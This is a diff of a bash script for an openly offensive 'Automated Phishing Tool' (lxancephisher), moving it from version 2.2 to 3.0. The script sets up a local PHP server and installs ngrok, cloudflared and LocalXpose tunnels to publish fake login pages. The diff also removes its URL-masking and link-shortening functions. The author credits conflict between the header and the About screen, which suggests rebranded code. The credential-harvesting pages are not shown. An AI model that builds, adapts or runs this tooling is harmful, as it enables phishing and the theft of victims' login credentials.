@@ -1,14 +1,9 @@
 #!/bin/bash
-# LxaNce
-# Bash Script for Hide Phishing URL Created by KP
 
-##   Lxphisher 	: 	Automated Phishing Tool
-##   Author 	: 	Prince Katiyar 
-##   Version 	: 	2.2
-##   Github 	: 	https://github.com/LxaNce-Hacker
-
-## If you Copy Then Give the credits :)
-
+##   lxancephisher 	: 	Automated Phishing Tool
+##   Author 	: 	Prince Katiyar
+##   Version 	: 	3.0
+##   Github 	: 	https://github.com/LxaNce-Hacker/lxancephisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -81,9 +76,14 @@
 ##    The precise terms and conditions for copying, distribution and
 ##    modification follow.
 ##
-##      Copyright (C) 2022  LxaNce-Hacker (https://github.com/LxaNce-Hacker)
+##      Copyright (C) 2022 LXANCE-HACKER (https://github.com/LxaNce-Hacker)
 ##
 
+__version__="3.0"
+
+## DEFAULT HOST & PORT
+HOST='127.0.0.1'
+PORT='8080' 
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -93,28 +93,41 @@ MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(prin
 RESETBG="$(printf '\e[0m\n')"
 
 ## Directories
+BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
+
 if [[ ! -d ".server" ]]; then
 	mkdir -p ".server"
 fi
+
+if [[ ! -d "auth" ]]; then
+	mkdir -p "auth"
+fi
+
 if [[ -d ".server/www" ]]; then
 	rm -rf ".server/www"
 	mkdir -p ".server/www"
 else
 	mkdir -p ".server/www"
 fi
-if [[ -e ".cld.log" ]]; then
-	rm -rf ".cld.log"
+
+## Remove logfile
+if [[ -e ".server/.loclx" ]]; then
+	rm -rf ".server/.loclx"
+fi
+
+if [[ -e ".server/.cld.log" ]]; then
+	rm -rf ".server/.cld.log"
 fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
-    exit 0
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+	exit 0
 }
 
 exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
-    exit 0
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated." 2>&1; reset_color; }
+	exit 0
 }
 
 trap exit_on_signal_SIGINT SIGINT
@@ -124,28 +137,25 @@ trap exit_on_signal_SIGTERM SIGTERM
 reset_color() {
 	tput sgr0   # reset attributes
 	tput op     # reset color
-    return
+	return
 }
 
 ## Kill already running process
 kill_pid() {
-	if [[ `pidof php` ]]; then
-		killall php > /dev/null 2>&1
-	fi
-	if [[ `pidof ngrok` ]]; then
-		killall ngrok > /dev/null 2>&1
-	fi
-	if [[ `pidof cloudflared` ]]; then
-		killall cloudflared > /dev/null 2>&1
-	fi
+	check_PID="php ngrok cloudflared loclx"
+	for process in ${check_PID}; do
+		if [[ $(pidof ${process}) ]]; then # Check for Process
+			killall ${process} > /dev/null 2>&1 # Kill the Process
+		fi
+	done
 }
 
 # Check for a newer release
 check_update(){
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/LxaNce-Hacker/RealLxPhisher/releases/latest'
+	relase_url='https://api.github.com/repos/LxaNce-Hacker/lxancephisher/releases/latest'
 	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/RealLxPhisher/archive/refs/tags/${new_version}.tar.gz"
+	tarball_url="https://github.com/LxaNce-Hacker/lxancephisher/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found\n"${WHITE}
@@ -153,15 +163,15 @@ check_update(){
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".RealLxPhisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".lxancephisher.tar.gz" "${tarball_url}"
 
-		if [[ -e ".RealLxPhisher.tar.gz" ]]; then
-			tar -xf .RealLxPhisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".lxancephisher.tar.gz" ]]; then
+			tar -xf .lxancephisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .RealLxPhisher.tar.gz
+			rm -f .lxancephisher.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run RealLxPhisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run lxancephisher again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
@@ -172,6 +182,13 @@ check_update(){
 	fi
 }
 
+## Check Internet Status
+check_status() {
+	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
+	timeout 3s curl -fIs "https://api.github.com" > /dev/null
+	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}"
+}
+
 ## Banner
 banner() {
 	cat <<- EOF
@@ -180,9 +197,9 @@ banner() {
 		${GREEN}	██░▀▀▄█░▄▄█░▀▀░█░███░████▀▄▀██░▀▀░█░▄▄░██░▄█▄▄▀█░▄▄░█░▄▄█░▀▀▄
 		${GREEN}	██░██░█▄▄▄█▄██▄█▄▄██░▀▀░█▄█▄██░████▄██▄█▄▄▄█▄▄▄█▄██▄█▄▄▄█▄█▄▄
 		${GREEN}	▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
-		${RED}                                Version : 2.2
+		${RED}          Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce(Prince Katiyar)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by LxaNce-Hacker (Prince Katiyar)${WHITE}
 	EOF
 }
 
@@ -192,89 +209,45 @@ banner_small() {
 		${BLUE}
 		${BLUE}░█░░░█░█░░░░█▀█░█░█░▀█▀░█▀▀░█░█
 		${BLUE}░█░░░▄▀▄░░░░█▀▀░█▀█░░█░░▀▀█░█▀█
-		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀
-		${WHITE}                               2.2			   
-		${GREEN}****************************************************************************************************************
+		${BLUE}░▀▀▀░▀░▀░▀░░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀${WHITE} ${__version__}
 	EOF
 }
 
-## About_Banner
-about_banner() {
-	cat <<- EOF
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡿⢟⣿⠛⢉⣿⣤⣤⣿⣷⣶⣾⣷⣼⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣡⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⢙⢛⣛⠻⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡿⢛⣝⣖⠀⠀⠀⡐⢸⡟⢹⡿⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠷⣿⣀⡹⠂⠀⠀⠀⠘⠛⠉⠁⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠀⢀⠁⠀⠀⠀⠀⠀⠀⠀⠀  ⠈⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠤⠴⠒⠁⠀⢀⣼⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⡿⢿⣿⣟⣉⣦⣀⡀⠀⠀⠀⠀⠀⣠⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡟⠁⠀⠈⢿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣿⢿⣯⣍⡿⢷⡦⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠢⡀⠀⠸⡇⠉⢻⣿⣿⣿⣿⣯⣭⣀⣸⣿⣿⣧⡀⠈⢄⠈⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⢠⡏⠀⠀⠀⠀⠀⠈⠢⠀⢳⠀⠀⠙⢿⣿⠫⠙⠛⠛⠛⣿⡿⠿⣇⠀⠸⠆⢈⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠈⡣⢀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠙⠅⠀⠀⢀⣾⣿⠁⢀⡎⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠈⠐⠠⡀⡀⠀⠀⠀⠂⡄⠀⠀⢈⠶⣤⣤⣭⣥⣤⣾⡇⠑⢴⠆⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⡁⠒⢄⣀⠀⠀⢐⠤⠁⠀⠡⡏⢫⡫⣺⣻⡇⠀⢨⢄⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠁⡠⠊⠀⠀⠀⠀⠀⡇⢀⠀⢸⣷⣦⡉⠀⠀⠀⠀⠈⢇⡻⢎⡫⠇⠀⡆⢨⣧⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠁⠆⢠⣿⣿⣿⣿⣿⣶⣄⡀⠀⠈⢻⣟⣱⠀⠘⢰⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠰⠆⠀⠀⠀⠀⠀⠀⠀⠀⢐⠂⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⢹⣿⠀⣠⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡌⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⢰⡆⠀⠀⠀⠀⠀⠙⠀⡸⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠄⠡⡀⠠⢄⡀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⡄⠀⠈⠂⠠⡈⠳⡄⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠈⠐⠨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⢡⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠀⢺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-		${GREEN}
-	EOF
-}
 ## Dependencies
 dependencies() {
 	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
-    if [[ -d "/data/data/com.termux/files/home" ]]; then
-        if [[ `command -v proot` ]]; then
-            printf ''
-        else
+	if [[ -d "/data/data/com.termux/files/home" ]]; then
+		if [[ ! $(command -v proot) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
-            pkg install proot resolv-conf -y
-        fi
+			pkg install proot resolv-conf -y
+		fi
 
-        if [[ `command -v tput` ]]; then
-            printf ''
-        else
+		if [[ ! $(command -v tput) ]]; then
 			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}ncurses-utils${CYAN}"${WHITE}
-            pkg install ncurses-utils -y
-        fi
+			pkg install ncurses-utils -y
+		fi
+	fi
 
-    fi
-
-	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
+	if [[ $(command -v php) && $(command -v curl) && $(command -v unzip) ]]; then
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
 	else
-		pkgs=(php curl wget unzip)
+		pkgs=(php curl unzip)
 		for pkg in "${pkgs[@]}"; do
 			type -p "$pkg" &>/dev/null || {
 				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
-				if [[ `command -v pkg` ]]; then
+				if [[ $(command -v pkg) ]]; then
 					pkg install "$pkg" -y
-				elif [[ `command -v apt` ]]; then
-					apt install "$pkg" -y
-				elif [[ `command -v apt-get` ]]; then
-					apt-get install "$pkg" -y
-				elif [[ `command -v pacman` ]]; then
+				elif [[ $(command -v apt) ]]; then
+					sudo apt install "$pkg" -y
+				elif [[ $(command -v apt-get) ]]; then
+					sudo apt-get install "$pkg" -y
+				elif [[ $(command -v pacman) ]]; then
 					sudo pacman -S "$pkg" --noconfirm
-				elif [[ `command -v dnf` ]]; then
+				elif [[ $(command -v dnf) ]]; then
 					sudo dnf -y install "$pkg"
+				elif [[ $(command -v yum) ]]; then
+					sudo yum -y install "$pkg"
 				else
 					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
 					{ reset_color; exit 1; }
@@ -282,48 +255,33 @@ dependencies() {
 			}
 		done
 	fi
-
 }
 
-## Check Internet Status
-check_status() {
-	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Internet Status : "
-	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "${GREEN}Online${WHITE}" && check_update || echo -e "${RED}Offline${WHITE}\n	${GREEN}YOU HAVE NO INETERNET CONNECTION, TRY AGAIN..."
-}
-
-## Download Ngrok
-download_ngrok() {
+# Download Binaries
+download() {
 	url="$1"
+	output="$2"
 	file=`basename $url`
-	if [[ -e "$file" ]]; then
-		rm -rf "$file"
+	if [[ -e "$file" || -e "$output" ]]; then
+		rm -rf "$file" "$output"
 	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
-	if [[ -e "$file" ]]; then
-		unzip "$file" > /dev/null 2>&1
-		mv -f ngrok .server/ngrok > /dev/null 2>&1
-		rm -rf "$file" > /dev/null 2>&1
-		chmod +x .server/ngrok > /dev/null 2>&1
-	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Ngrok manually."
-		{ reset_color; exit 1; }
-	fi
-}
+	curl --silent --insecure --fail --retry-connrefused \
+		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"
 
-## Download Cloudflared
-download_cloudflared() {
-	url="$1"
-	file=`basename $url`
 	if [[ -e "$file" ]]; then
+		if [[ ${file#*.} == "zip" ]]; then
+			unzip -qq $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		elif [[ ${file#*.} == "tgz" ]]; then
+			tar -zxf $file > /dev/null 2>&1
+			mv -f $output .server/$output > /dev/null 2>&1
+		else
+			mv -f $file .server/$output > /dev/null 2>&1
+		fi
+		chmod +x .server/$output > /dev/null 2>&1
 		rm -rf "$file"
-	fi
-	wget --no-check-certificate "$url" > /dev/null 2>&1
-	if [[ -e "$file" ]]; then
-		mv -f "$file" .server/cloudflared > /dev/null 2>&1
-		chmod +x .server/cloudflared > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -336,16 +294,15 @@ install_ngrok() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm64.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
 		else
-			download_ngrok 'https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip'
+			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
 		fi
 	fi
-
 }
 
 ## Install Cloudflared
@@ -356,16 +313,34 @@ install_cloudflared() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
 		else
-			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
+			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
 		fi
 	fi
+}
 
+## Install LocalXpose
+install_localxpose() {
+	if [[ -e ".server/loclx" ]]; then
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
+	else
+		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
+		arch=`uname -m`
+		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
+		elif [[ "$arch" == *'aarch64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
+		elif [[ "$arch" == *'x86_64'* ]]; then
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
+		else
+			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
+		fi
+	fi
 }
 
 ## Exit message
@@ -377,25 +352,23 @@ msg_exit() {
 
 ## About
 about() {
-	{ clear; about_banner; banner; echo; }
+	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}Prince Katiyar ${RED}[ ${ORANGE}LxaNce-Hacker ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/LxaNce-Hacker
-		${GREEN}Social   ${RED}:  ${CYAN}https://lxance.xyz
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
+		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}LXANCE-HACKER ${RED}]
+		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/LxaNce-Hacker
+		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
+		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
-		${REDBG}${WHITE} Thanks : For Support ${RESETBG}
-
-		${RED}Warning:${WHITE}
-		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
-		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
-
+		${WHITE} ${REDBG}Warning:${RESETBG}
+		${CYAN}  This Tool is made for educational purpose 
+		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
+		  any misuse of this toolkit ${RED}!${WHITE}
+		  
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
 	EOF
 
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
 	case $REPLY in 
 		99)
 			msg_exit;;
@@ -408,12 +381,8 @@ about() {
 	esac
 }
 
-## Setup website and start php server
-HOST='127.0.0.1'
-PORT='8080'
-
 ## Choose custom port
-custom_port() {
+cusport() {
 	echo
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
@@ -424,88 +393,29 @@ custom_port() {
 			echo
 		else
 			echo -ne "\n\n${RED}[${WHITE}!${RED}]${RED} Invalid 4-digit Port : $CU_P, Try Again...${WHITE}"
-			{ sleep 2; clear; banner_small; cusport; }
+			{ sleep 2; clear; banner; cusport; }
 		fi		
 	else 
 		echo -ne "\n\n${RED}[${WHITE}-${RED}]${BLUE} Using Default Port $PORT...${WHITE}\n"
 	fi
 }
 
-## Custom Mask URL
-custom_mask() {
-	{ sleep .5; clear; banner_small; echo; }
-	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want To Change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
-	echo
-	if [[ ${mask_op,,} == "y" ]]; then
-		echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Enter your custom URL below ${CYAN}(${ORANGE}Example: https://example.com${CYAN})\n"
-		read -e -p "${WHITE} ==> ${ORANGE}" -i "https://" mask_url # initial text requires Bash 4+
-		if [[ ${mask_url//:*} =~ ^([h][t][t][p][s]?)$ || ${mask_url::3} == "www" ]] && [[ ${mask_url#http*//} =~ ^[^,~!@%:\=\#\;\^\*\"\'\|\?+\<\>\(\{\)\}\\/]+$ ]]; then
-			mask=$mask_url
-			echo -e "\n${RED}[${WHITE}-${RED}]${CYAN} Using Custom Masked Url :${GREEN} $mask"
-		else
-			echo -e "\n${RED}[${WHITE}!${RED}]${ORANGE} Invalid Url Type..Using The Default One.."
-		fi
-	fi
-}
-
-## URL Shortner
-site_stat() { [[ ${1} != "" ]] && curl -s -o "/dev/null" -w "%{http_code}" "${1}https://github.com"; }
-
-shorten() {
